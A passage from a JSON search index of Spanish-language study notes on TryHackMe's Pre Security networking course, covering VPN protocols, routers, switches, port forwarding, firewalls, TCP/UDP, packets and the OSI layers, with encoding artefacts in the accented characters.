tecnolog√≠a no es capaz de dejar una red por s√≠ misma (no routeable). |\n| PPTP               | Point-to-Point Tunneling Protocol (PPTP) es la tecnolog√≠a que permite a la informaci√≥n de PPP viajar y dejar la red.<br><br>Es muy f√°cil de montar pero su encriptaci√≥n es d√©bil en comparaci√≥n a otras tecnolog√≠as.                                 |\n| IPSec              | Internet Protocol Security encripta la informaci√≥n usando el marco de trabajo IP existente.<br><br>Es m√°s dif√≠cil de montar pero tambi√©n tiene considerablemente buena encriptaci√≥n.                                                                 |",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. LAN Networking Devices",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/5-extending-your-network/4-lan-networking-devices/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/5. Extending your Network/4. LAN Networking Devices.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 5. Extending your Network",
    "content": "<h2>¬øQu√© es un Router?</h2>\n\nEl trabajo de un router es conectar redes y pasar informaci√≥n entre ellas. Lo hace haciendo routing.\n\nRouting es el nombre que se le da al proceso de transportar informaci√≥n entre redes. Implica crear un camino entre redes para que esta informaci√≥n pueda viajar entre ellas. Los routers operan en la capa 3 del modelo OSI. Permiten al administrador configurar varias reglas sobre el redireccionamiento de puertos o el firewall.\n\nImagin√©monos un ordenador A conectado a un ordenador B mediante redes. Para que esas redes se conecten necesitamos routers. En concreto en este ejemplo hay dos. El camino que tomar√° la informaci√≥n depende de:\n![[005.png]]\n- ¬øQu√© camino es el m√°s corto?\n- ¬øQu√© camino es m√°s fiable?\n- ¬øQu√© camino tiene el medio m√°s r√°pido?\n\n--------------------\n<h2>¬øQu√© es un Switch?</h2>\nUn switch es un dispositivo dedicado a red que provee de conexi√≥n a m√∫ltiples dispositivos.\n\nPueden operar bien en la capa 2 o en la 3 del modelo OSI. De todas formas, son exclusivos. Un switch de la capa 2 no puede operar en la capa 3.\n\n<h4>Switch Capa 2</h4>\nLos switches reenviar√°n los frames (marcos) a los dispositivos conectados usando sus direcciones MAC.\n\n![[006.png]]\n\nEstos switches son s√≥lamente responsables de mandar los frames a los dispositivos correctos.\n<h4>Switch Capa 3</h4>\nEstos son m√°s sofisticados que los de la capa 2 ya que pueden realizar algunas de las responsabilidades del router. Estos switches mandar√°n frames a los dispositivos y paquetes de route a otros dispositivos usando el protocolo IP.\n\nVeamos un ejemplo, hay dos IP's:\n\n- 192.168.1.1\n- 192.168.2.1\n\nUna tecnolog√≠a llamada VLAN (Virtual Local Area Network) permite a dispositivos concretos dentro de una red estar partidos virtualmente. \n\n![[007.png]]\n\nDe esta manera se hace que los dos departamentos puedan acceder a internet, pero no puedan comunicarse uno con otro (aunque est√°n conectados al mismo switch).\n\n[[1. What is Networking]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction to Port Forwarding",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/5-extending-your-network/1-introduction-to-port-forwarding/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/5. Extending your Network/1. Introduction to Port Forwarding.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 5. Extending your Network",
    "content": "El redireccionamiento de puertos es un componente esencial al conectar aplicaciones y servicios a internet. Sin √©l, los servicios y aplicaciones s√≥lo estar√≠an disponibles en los dispositivos en la misma red.\n\nTomaremos de ejemplo la siguiente red. En esta red, el dispositivo con IP 192.168.1.10 est√° corriendo un servidor web en el puerto 80. S√≥lo los dispositivos conectados a la misma red podr√°n acceder. Esto se llama intranet.\n![[002.png]]\n\nSi el administrador quisiera que fuera accesible para el reso del p√∫blico, necesitar√≠a implementar redireccionamiento de puertos.\n\n![[003.png]]\nCon este dise√±o, la red #2 ahora ser√≠a capaz de acceder al servidor web corriendo en la redi #1 usando la Ip p√∫blica de la red #1: 82.62.51.70 .\n\nEl redireccionamiento de puertos se configura en el router de la red.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Firewalls 101",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/5-extending-your-network/2-firewalls-101/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/5. Extending your Network/2. Firewalls 101.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 5. Extending your Network",
    "content": "un firewall es un dispositivo dentro de una red responsable d determinar qu√© tr√°fico tiene permitida la entrada y la salida. Es b√°sicamente una frontera de seguridad. El administrador de la red puede configurar el firewall para permitir o no al tr√°fico entrar o salir bas√°ndose en:\n\n- ¬øDe d√≥nde viene el tr√°fico?\n- ¬øHacia d√≥nde va el tr√°fico?\n- ¬øEn qu√© puerto se maneja el tr√°fico?\n- ¬øQu√© protocolo utiliza el tr√°fico?\n\nLos firewalls realizan inspecci√≥n de paquetes para responder a estas preguntas. Adem√°s vienen en un mont√≥n de formas. Puede ser un dispositivo de hardware dedicado, como en una red gigante, o un router como en  una red dom√©stica, hasta sofware, como *Snort*.\n\nCubriremos las dos categor√≠as principales:\n\n| **Categor√≠a de Firewall** | **Descripci√≥n**                                                                                                                                                                                                                                                                         |\n| ------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| Stateful                  | Este tipo de firewall usa toda la informaci√≥n de una conexi√≥n m√°s que inspeccionar un paquete individual.<br><br>Consume muchos recursos en comparaci√≥n a un firewall sin estado porque la toma de decisiones es din√°mica.                                                              |\n| Stateless                 | Este tipo de firewall usa un set de reglas est√°ticas para determinar si los paquetes individuales son aceptados o no<br><br>Estos usan menos recursos, pero tambi√©n son menos audaces.<br><br>De cualquier forma, estos frewalls son buenos recibiendo un elevado n√∫mero de peticiones. |",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Practical - Network Simulator",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/5-extending-your-network/5-practical-network-simulator/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/5. Extending your Network/5. Practical - Network Simulator.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 5. Extending your Network",
    "content": "",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. TCP-IP (Three-Way Handshake)",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/4-packets-and-frames/2-tcp-ip-three-way-handshake/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/4. Packets and Frames/2. TCP-IP (Three-Way Handshake).md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 4. Packets and Frames",
    "content": "TCP es otra de estas reglas usada en el networking ([[1. What is Networking]]).\n\nEste protocolo es muy similar al modelo OSI que hemos discutido en [[1. What is the OSI Model]]. Este protocolo consiste de cuatro capas y es como una versi√≥n resumida del modelo OSI. Las capas son:\n\n- Application.\n- Transporte.\n- Internet.\n- Network Interface.\n\nMuy similar a como funciona el modelo OSI, se a√±ade informaci√≥n en cada capa (encapsulaci√≥n).\n\nTCP es connection-based, lo que quiere decir qye debe establecer una conexi√≥n entre el servidor y el cliente antes de mandar informaci√≥n.\n\nTCP garantiza la entrega precisa de la informaci√≥n. Este proceso se conoce como Three-Way Handshake. Algunas ventajas y desventajas de TCP son:\n\n| **Ventajas de TCP**                                                                           | **Desventajas de TCP**                                                                                                            |\n| --------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------- |\n| Garantiza la integridad de la informaci√≥n.                                                    | Necesita una conexi√≥n fiable entre los dos dispositivos. Cualquier paquete pasado incorrecto queda inv√°lido y hay que reenviarlo. |\n| Capaz de conecar dos dispositivos y evitar que se saturen de informaci√≥n en orden incorrecto. | Una conexi√≥n lenta puede causar cuello de botella en el otro dispositivo porque se reserva la conexi√≥n entre ellos.               |\n| Hace un mont√≥n m√°s de procesos y comprobaciones                                               | Bastante m√°s lento que UDP por ese motivo.                                                                                        |\nLos paquetes TCP contienen varias secciones, con informaci√≥n, conocidas como Headers:\n\n| Header                 | Descripcion                                                                                                                                                                                                        |\n| ---------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |\n| Source Port            | Contiene el valor del puerto desde el cual se manda el paquete. Entre el 0 y el 65535 (que no est√© siendo ya utilizado).                                                                                           |\n| Destination Port       | Contiene el valor del puerto donde corre el servicio en la m√°quina receptora (puerto 80 para web por ejemplo).                                                                                                     |\n| Source IP              | Direcci√≥n IP del dispositivo que manda el paquete.                                                                                                                                                                 |\n| Destination IP         | Direcci√≥n IP del dispositivo que recibe el paquete.                                                                                                                                                                |\n| Sequence Number        | Cuando se establece una conexi√≥n, la primera parte de la informaci√≥n transmitida es un n√∫mero random.                                                                                                              |\n| Acknowledgement Number | Despu√©s de la primera comunicaci√≥n, la siguiente tendr√° el numero de secuencia + 1.                                                                                                                                |\n| Checksum               | Es lo que le da la fiabilidad a TCP. Del lado emisor se hace una comrpobaci√≥n de hash. Despu√©s de haberse recibido, del lado receptor se hace una comprobaci√≥n de hash y si no coinciden el archivo est√° corrupto. |\n| Data                   | La parte donde la informaci√≥n que est√° siendo transmitida se almacena.                                                                                                                                             |\n| Flag                   | Este header determina como ser√°n trataados los paquetes de cada lado. Diferentes flags llevar√°n a diferentes tratamientos                                                                                          |\nVamos a explorar el Three-Way Handshake, el t√©rmino usado para el proceso de conexi√≥n entre dos dispositivos. Un Three-Way Handshake ocurre de la siguiente manera:\n\n| **Paso** | **Mensaje** | **Descripci√≥n**                                                                                                                    |\n| -------- | ----------- | ---------------------------------------------------------------------------------------------------------------------------------- |\n| 1        | SYN         | Es el paquete inicial mandado por el cliente. Es usado para iniciar la comunicaci√≥n.                                               |\n| 2        | SYN/ACK     | Es mandado por el servidor para establecer que el SYN ha sido recibido.                                                            |\n| 3        | ACK         | Puede ser usado tanto por el servidor como por el cliente para establecer que una serie de paquetes se han recibido correctamente. |\n| 4        | DATA        | Una vez que la conexi√≥n est√° establecida, la informaci√≥n se manda mendiante el paquete DATA.                                       |\n| 5        | FIN         | Este paquete se utiliza para cerrar correctamente la conexi√≥n entre los dispositivos despu√©s de la comunicaci√≥n.                   |\n| #        | RST         | Este paquete termina la comunicaci√≥n de manera abrupta y es la manera de decir que hubo un error.                                  |\n1. SYN - Cliente: Aqu√≠ esta mi ISN (Initial Sequence Number) para SYNcronizarte (0).\n2. SYN/ACK - Server: Aqu√≠ est√° mi ISN (5000) y yo ACKnoledge (reconozco) tu ISN (0).\n3. ACK - Cliente: Yo ACK tu ISN (5000) y aqu√≠ hay algo de mi informaci√≥n ISN +1 (1).\n\n![[000.jpg]]\n\n------------------------\n<h3>Cerrando una conexi√≥n con TCP</h3>\nTCP cerrar√° una conexi√≥n una vez que sea sabido que el otro dispositivo hay recibido correctamente toda la informaci√≥n.\n\nPara iniciar la finalizaci√≥n de la comunicaci√≥n se manda un paquete FIN. El otro dispositivo hace un ACK del FIN del otro y manda un FIN suyo. Por √∫ltimo el primer dispositivo hace un ACK del FIN del segundo.\n\n![[001.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Packets and Frames",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/4-packets-and-frames/0-packets-and-frames/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/4. Packets and Frames/0. Packets and Frames.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 4. Packets and Frames",
    "content": "[[1. What are Packets and Frames]]\n[[2. TCP-IP (Three-Way Handshake)]]\n[[3. UDP-IP]]\n[[4. Ports 101 (Practical)]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Ports 101 (Practical)",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/4-packets-and-frames/4-ports-101-practical/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/4. Packets and Frames/4. Ports 101 (Practical).md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 4. Packets and Frames",
    "content": "Los puertos son puntos esenciales en los cuales la informaci√≥n se intercambia. Poniento un s√≠mil mar√≠timo, aquellos barcos que quieren atracar en un puerto, deben hacerlo en un espacio compatible con sus cualidades.\n\nEn inform√°tica los puertos se representan con n√∫meros desde el 0 hasta el 65535. Al haber tantos, si no llev√°ramos una cuenta ser√≠a un caos. Es por ello que existen ciertos est√°ndares b√°sicos de comunicaci√≥n (como HTTP) destinados en puertos fijos a lo largo de todos los ordenadores del mundo. Por eso todos los sesrvidores web mandan la informacii√≥n al puerto 80.\n\nTodos los puertos entre el 0 y el 1024 se conocen como puertos comunes. Algunos de los m√°s conocidos son:\n\n| **Protocolo**                                                      | **N√∫mero de puerto** | **Descripci√≥n**                                                                                          |\n| ------------------------------------------------------------------ | -------------------- | -------------------------------------------------------------------------------------------------------- |\n| **F**ile **T**ransfer **P**rotocol (**FTP**)                       | 21                   | Se usa para compartir archivos y/o descargarlos                                                          |\n| **S**ecure **Sh**ell (**SSH**)                                     | 22                   | Se usa para conectarse de forma remota a un equipo.                                                      |\n| **H**yper**T**ext Transfer Protocol (**HTTP**)                     | 80                   | Este protocolo hace funcionar la WWW. El buscador usa esto para descargar im√°genes y videos de las webs. |\n| **H**yper**T**ext¬†**T**ransfer **P**rotocol¬†**S**ecure (**HTTPS**) | 443                  | Hace lo mismo que la de arriba pero de forma segura con encriptaci√≥n.                                    |\n| **S**erver **M**essage **B**lock (**SMB**)                         | 445                  | Es similar a FTP pero a parte de archivos permite tambien compartir dispositivos, como impresoras.       |\n| **R**emote **D**esktop **P**rotocol (**RDP**)                      | 3389                 | Sirve para conectarse remotamente a un equipo, pero con interfaz gr√°fica.                                |\n[Lista de los 1024 puertos](http://www.vmaxx.net/techinfo/ports.htm)\n\nPuedes cambiar los puertos para tus servivios (por ejemplo correr un servicio wed en el puerto 8000) pero los servidores asumir√°n que est√° en el 80 por defecto, por lo que tendr√°s que a√±adir dos puntos `:` para a√±adir el puerto `<direcci√≥n_ip>:<puerto>`.\n\n----------------------------------\n<h2>Pr√°ctica</h2>\n\n1. ![[000.png]]\n2. ![[001.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. UDP-IP",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/4-packets-and-frames/3-udp-ip/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/4. Packets and Frames/3. UDP-IP.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 4. Packets and Frames",
    "content": "Es un protocolo sin estados, no como TCP.\n\nAlgunas ventajas y desventajas de UDP frente a TCP:\n\n| **Ventajas de UDP**                                                                | **Desventajas de UDP**                                         |\n| ---------------------------------------------------------------------------------- | -------------------------------------------------------------- |\n| UDP es muchi mas r√°pido que TCP.                                                   | A UDP no le importa si la informaci√≥n es recibida              |\n| UDP deja la aplicacion para decidir si hay control sobre c√≥mo de r√°pido se mandan. | Es flexible para los desarrolladores de software               |\n| UDP no reserva una conexi√≥n                                                        | Las conexiones inestables resultan en una experiencia nefasta. |\nComo mencionamos anteriormente, no existe proceso que forme una conexi√≥n entre dispositivos. Los headers de UDP son menos y los paquetes m√°s sencillos:\n\n| **Header**          | **Descripci√≥n**                                                                      |\n| ------------------- | ------------------------------------------------------------------------------------ |\n| Time to Live (TTL)  | Tiempo de expiraci√≥n dell paquete.                                                   |\n| Source Address      | La direcci√≥n IP del dispositivo que manda la informaci√≥n.                            |\n| Destination Address | La direcci√≥n IP del dispositivo que recibe la informaci√≥n.                           |\n| Source Port         | Puerto entre el 0 y el 65535 que no est√© en uso desde donde se env√≠a la informaci√≥n. |\n| Destination Port    | Puerto entre el 0 y el 65535 donde se encuentra corriendo el servicio receptor.      |\n| Data                | Almacena la informcai√≥n del env√≠o.                                                   |\nUDP es stateless (sin estado). Eso quiere decir que la conexi√≥n se ve de esta manera:\n\n1. Request - Client.\n2. Response - Server.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. What are Packets and Frames",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/4-packets-and-frames/1-what-are-packets-and-frames/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/4. Packets and Frames/1. What are Packets and Frames.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 4. Packets and Frames",
    "content": "Son peque√±as piezas de informaci√≥n que, al combinarse todas juntas forman una pieza mayor.\n\nUn frame (o marco) est√° en el nivel [[3. Layer 2 - Data Link]], queriendo esto decir que no contiene informaci√≥n tal como la direcci√≥n IP. Wl frame ser√≠a, por as√≠ decirlo, el sobre de una carta (sin remitente ni destino).\n\nEste proceso es llamado encapsulaci√≥n, del que hablamos en [[1. What is the OSI Model]]. En esta fase cuando hablamos de direcciones IP, estamos hablando del marco en s√≠. \n\nLos paquetes son una forma eficiente de comunicar informaci√≥n a trav√©s de una red. Gracias al tama√±o peque√±o de los paquetes es f√°cil de evitar los cuellos de botella. El archivo final es reconstruido a partir de los paquetes mandados en el dispositivo de destino.\n\nDebido a que hay diferentes estructuras de paquetes, si no hubiera estndarizaci√≥n, podr√≠a romper las comunicaciones. Es por esto que existen Headers, que ampl√≠an informaci√≥n sobre los paquetes mandados:\n\n| **Header**          | **Descripci√≥n**                                                                                      |\n| ------------------- | ---------------------------------------------------------------------------------------------------- |\n| Time to Live        | Pone un temporizador de expiraci√≥n para que los paquetes que no son recibidos no saturen la red      |\n| Checksum            | Este campo le sirve a los protocolos como TCP/IP para comprobar si ha habido p√©rdida de informaci√≥n. |\n| Source Address      | Contiene la direcci√≥n IP de la m√°quina desde la que se mandan los datos.                             |\n| Destination Address | Contiene la direcci√≥n IP de la m√°quina hacia la que se mandan los datos.                             |",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. What is the OSI Model",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/3-osi-model/1-what-is-the-osi-model/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/3. OSI Model/1. What is the OSI Model.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 3. OSI Model",
    "content": "El modelo OSI (Open System Interconnection) es un modelo esencial usado en el networking ([[1. What is Networking]]). Este modelo cr√≠tico provee un marco de trabajo dictaminando c√≥mo todos los dispositivos de red enviar√°n, recibir√°n e interpretar√°n la informaci√≥n.\n\nUno de los beneficios principales del modelo OSI es que los dispositivos tengan funciones y dise√±os diferentes en una red mientras se comunican con otros dispositivos. Los datos que siguen el modelo OSI pueden ser entendidos por otros dispositivos.\n\nLa encapsulaci√≥n es el proceso mediante el cual informaci√≥n es a√±adida a los datos.\n\nEste modelo OSI consta de 7 capas que veremos a continuaci√≥n:\n\n[[2. Layer 1 - Physical]]\n[[3. Layer 2 - Data Link]]\n[[4. Layer 3 - Network]]\n[[5. Layer 4 - Transport]]\n[[6. Layer 5 - Session]]\n[[7. Layer 6 - Presentation]]\n[[8. Layer 7 - Application]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "7. Layer 6 - Presentation",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/3-osi-model/7-layer-6-presentation/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/3. OSI Model/7. Layer 6 - Presentation.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 3. OSI Model",
    "content": "La capa 6 es la capa en la que comienza a tener lugar la estandarizaci√≥n. Debido a que los desarrolladores de software pueden desarrollar cualquier software, los datos deben de manejarse de la misma manera.\n\nEsta capa act√∫a como traductor de datos hacia y desde la capa de aplicaci√≥n (capa 7). El ordenador receptor tambi√©n entender√° los datos enviados a un ordenador en un formato (por ejemplo un email) y aunque el ordenador emisor tenga un cliente diferente deben entenderse entre s√≠.\n\nLas funcionalidades de seguridad como la encriptaci√≥n ocurren en este nivel (HTTPS).",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "9. Pr√°ctica - OSI Game",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/3-osi-model/9-practica-osi-game/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/3. OSI Model/9. Pr√°ctica - OSI Game.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 3. OSI Model",
    "content": "",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Layer 5 - Session",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/3-osi-model/6-layer-5-session/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/3. OSI Model/6. Layer 5 - Session.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 3. OSI Model",
    "content": "Una vez que la informaci√≥n ha sido correctamente traducido o formateado de la capa de presentaci√≥n, la capa actual comenzar√° a crear y mantener la conexi√≥n al ordenador al que debe llegar la informaci√≥n. Cuando se establece la conexi√≥n, se crea una sesi√≥n que estar√° activa mientras dure la conexi√≥n.\n\nEsta capa tambi√©n es la responsable de cerrar la conexi√≥n si no se ha usado en mucho tiempo o si se ha perdido. Adem√°s, la sesi√≥n puede tener checkpoints, de tal manera que si se pierde la informaci√≥n en cierto punto, s√≥lo se tenga que mandar la informaci√≥n m√°s reciente.\n\nLas sesiones son √∫nicas, por lo que la informaci√≥n no puede viajar entre sesiones",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. OSI Model",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/3-osi-model/0-osi-model/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/3. OSI Model/0. OSI Model.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 3. OSI Model",
    "content": "[[1. What is the OSI Model]]\n[[2. Layer 1 - Physical]]\n[[3. Layer 2 - Data Link]]\n[[4. Layer 3 - Network]]\n[[5. Layer 4 - Transport]]\n[[6. Layer 5 - Session]]\n[[7. Layer 6 - Presentation]]\n[[8. Layer 7 - Application]]\n[[9. Pr√°ctica - OSI Game]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "8. Layer 7 - Application",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/3-osi-model/8-layer-7-application/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/3. OSI Model/8. Layer 7 - Application.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 3. OSI Model",
    "content": "La capa 7 es la capa de aplicaci√≥n. Implementa protocolos y reglas para decidir c√≥mo tiene que interactuar el usuario con los datos enviados o recibidos.\nLas aplicaciones cotidianas como los clientes de correo electr√≥nico, los navegadores o el software de navegaci√≥n de archivos proporcionan una Graphical User Interface (GUI) amigable y gr√°fica. Otros protocolos incluyen DNS (Domain Name System), que es la forma en la que los nombres de las web se convierten en IP's.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Layer 3 - Network",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/3-osi-model/4-layer-3-network/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/3. OSI Model/4. Layer 3 - Network.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 3. OSI Model",
    "content": "La tercera capa del modelo OSI el la capa de red que es donde ocurren el routing y el reensamblaje de los datos.\n\nEl routing determina el camino √≥ptimo para el viaje de los datos. Los protocolos que deciden este camino son:\n\n- OSPF (Open Shortest Path First).\n- RIP (Routing Information Protocol).\n\nLa ruta tomada es decidida en funci√≥n de:\n\n- ¬øQu√© camino es el m√°s corto?\n- ¬øQu√© camino es el m√°s fiable?\n- ¬øCu√°l es el camino m√°s r√°pido?\n\nEn este nivel todo es discutido v√≠a IP.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Layer 1 - Physical",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/3-osi-model/2-layer-1-physical/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/3. OSI Model/2. Layer 1 - Physical.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 3. OSI Model",
    "content": "Este nivel se refiere a los componentes f√≠sicos del hardware usado en el networking y es el m√°s bajo que hay. Los dispositivos usan se√±ales el√©ctricas para transmitir informaci√≥n entre ellos utilizando el sistema binario (0's y 1's).",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Layer 2 - Data Link",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/3-osi-model/3-layer-2-data-link/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/3. OSI Model/3. Layer 2 - Data Link.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 3. OSI Model",
    "content": "La capa de data link se centra en el direccionamiento f√≠sico de la informaci√≥n. Recibe un paquete de la capa de red (network), incluida la IP y agrega la direcci√≥n f√≠sica (MAC). Dentro de cada equipo hay una NIC (Network Interface Card) la cual viene con una direcci√≥n MAC √∫nica para identificarla.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Layer 4 - Transport",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/3-osi-model/5-layer-4-transport/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/3. OSI Model/5. Layer 4 - Transport.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 3. OSI Model",
    "content": "La capa 4 del modelo OSI juega un rol vital en transmitir informaci√≥n a trav√©s de la red. Cuando la informaci√≥n es enviada, sigue uno de los siguientes caminos:\n\n- TCP\n- UDP\n\n---------------\n<h2>TCP</h2>\nTransmission Control Protocol, pensado con fiabilidad y garant√≠a como motivo, reserva una conexi√≥n constante entre los dos dispositivos mientras la informaci√≥n est√© en camino. Adem√°s, TCP incorpora la comprobaci√≥n de errores en su dise√±o. Esta es la forma en la que TCP garantiza que la informaci√≥n enviada a cachos en la capa 5 sea reensamblada en el mismo orden y sin alteraciones.\n\n| **Ventajas de¬†TCP**                      | **Desventajas de¬†TCP  <br>**                                                                                                              |\n| ---------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------- |\n| Garantiza que los datos est√©n correctos. | Requiere una conexi√≥n estable entre los dispositivos. Si un trozo de la informaci√≥n no es recibido, el paquete entero queda inutilizable. |\n| Capaz de sincronizar dos dispositivos.   | Una conexi√≥n lenta puede causar un cuello de botella en otro dispositivo.                                                                 |\n| Hace m√°s comprobaciones para fiabilidad. | TCP es m√°s lento que UDP por las comprobaciones que hace.                                                                                 |\nTCP es usado en compartir archivos, buscar en internet o enviar emails. Esto es porque los servicios requieren que la informaci√≥n mandada sea precisa.\n\n----------------\n<h2>UDP</h2>\n\nUser Datagram Protocol, no es tan avanzado como TCP y tampoco ofrece tantas funcionalidades.\n\n| **Ventajas de¬†UDP**                                                                                              | **Desventajas de¬†UDP**                                                     |\n| ---------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------- |\n| UDP¬†mucho m√°s r√°pido¬†TCP.                                                                                        | A UDP¬†no le importa si la informaci√≥n es recibida.                         |\n| UDP¬†abandona la capa de aplicaci√≥n para decidir si hay alg√∫n control sobre c√≥mo de r√°pido se env√≠an los paquetes | Conexiones inestables resultan en una experiencia nefasta para el usuario. |\n| UDP¬†no reserva una conexi√≥n entre dispositivos como hace¬†TCP.                                                    |                                                                            |\nUDP es √∫til en situaciones donde hay peque√±as piezas de informaci√≥n siendo mandadas. Por ejemplo ARP o DHCP (vistos en [[3. ARP]] y [[4. DHCP]]) o archivos muy grandes como streaming de video.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. What is Networking",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/1-what-is-networking/0-what-is-networking/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/1. What is Networking/0. What is Networking.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 1. What is Networking",
    "content": "[[1. What is Networking]]\n[[2. What is the Internet]]\n[[3. Identifying Devices on a Network]]\n[[4. Ping (ICMP)]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. What is Networking",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/1-what-is-networking/1-what-is-networking/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/1. What is Networking/1. What is Networking.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 1. What is Networking",
